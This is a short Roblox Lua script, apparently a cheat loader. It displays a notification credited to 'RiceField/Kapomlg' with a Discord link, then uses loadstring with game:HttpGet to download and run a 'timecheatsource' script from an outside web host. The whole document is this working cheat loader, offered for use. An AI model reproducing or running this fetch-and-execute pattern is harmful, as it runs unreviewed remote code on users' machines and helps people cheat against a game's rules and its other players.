wait(2)
local function callback(Text)
 if Text == "Close" then
  print ("closed")
 elseif Text == ("Button2 text") then
  print ("Answer2")
 end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--
game.StarterGui:SetCore("SendNotification",  {
 Title = "dsc.gg/archs";
 Text = "Made By RiceField/Kapomlg | Great people";
 
 Duration = 5;

 
 Callback = NotificationBindable;
})
 loadstring(game:HttpGet("http://jbleb.wz.cz/ricehub/timecheatsource.txt"))();
 